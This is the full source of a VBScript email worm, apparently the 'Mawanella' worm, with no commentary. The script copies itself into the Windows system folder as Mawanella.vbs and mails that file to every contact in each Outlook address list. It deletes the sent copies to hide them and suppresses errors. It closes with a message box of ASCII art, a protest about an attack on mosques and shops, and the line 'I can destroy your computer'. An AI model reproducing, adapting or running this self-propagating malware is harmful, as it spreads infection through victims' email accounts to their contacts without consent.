On Error Resume Next
Rem // I hate Mawanella incident
Set W_S = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()

sub main()
   On Error Resume Next
   dim wscr,rr, strMsg
   set wscr=CreateObject("WScript.Shell")
      Set dirwin = fso.GetSpecialFolder(0)
      Set dirsystem = fso.GetSpecialFolder(1)
      Set dirtemp = fso.GetSpecialFolder(2)
      Set cFile = fso.GetFile(WScript.ScriptFullName)
      cFile.Copy(dirsystem&"\Mawanella.vbs")
     
Set OutlookA = CreateObject("Outlook.Application")
If OutlookA = "Outlook" Then
   Set Mapi=OutlookA.GetNameSpace("MAPI")
   Set AddLists=Mapi.AddressLists
   For Each ListIndex In AddLists
       If ListIndex.AddressEntries.Count <> 0 Then
	  ContactCountX = ListIndex.AddressEntries.Count
	  For Count= 1 To ContactCountX
              Set MailX = OutlookA.CreateItem(0)
	      Set ContactX = ListIndex.AddressEntries(Count)
              'msgbox contactx.address
              'Mailx.Recipients.Add(ContactX.Address)
              MailX.To = ContactX.Address
	      MailX.Subject = "Mawanella"
	      MailX.Body = vbcrlf&"Mawanella is one of the Sri Lanka's Muslim Village"&vbcrlf
	      'Set Attachment=MailX.Attachments
	      'Attachment.Add dirsystem & "\Mawanella.vbs"
	      'Mailx.Attachments.Add(dirsystem & "\Mawanella.vbs")
	      Mailx.Attachments.Add(dirsystem & "\Mawanella.vbs")
	      MailX.DeleteAfterSubmit = True
	      If MailX.To <> "" Then
		 MailX.Send
 	      End If
           Next
       End If
   Next
Else
   msgBox "Please Forward this to everyone" 
End if

strMsg= "  )                    (" & vbcrlf
strMsg= strMsg & "(  )                (   )  " & vbcrlf
strMsg= strMsg & "  (    )          (   )" & vbcrlf
strMsg= strMsg & "    (   )      (         )" & vbcrlf
strMsg= strMsg & "    -------------------------" & vbcrlf
strMsg= strMsg & "   /       (   (    (      /\" & vbcrlf
strMsg= strMsg & "  /          (             /  \" & vbcrlf
strMsg= strMsg & " /            ( (         /    \" & vbcrlf
strMsg= strMsg & " --------------------------------" & vbcrlf
strMsg= strMsg & " |                ---      |      |" & vbcrlf
strMsg= strMsg & " |  -----        |   |      |      |" & vbcrlf
strMsg= strMsg & " | |     |        ---       |      |" & vbcrlf
strMsg= strMsg & " | |     |                  |      |" & vbcrlf
strMsg= strMsg & " --------------------------------" & vbcrlf

strMsg= strMsg & "Mawanella is one of the Sri Lanka's Muslim Village." & vbcrlf 
strMsg= strMsg & "This brutal incident happened here 2 Muslim Mosques & 100 Shops are burnt." & vbcrlf 
strMsg= strMsg & "I hat this incident, What about you? I can destroy your computer" & vbcrlf 
strMsg= strMsg & "I didn't do that because I am a peace-loving citizen."
 
msgbox strMsg,,"Mawanella"

End sub

 
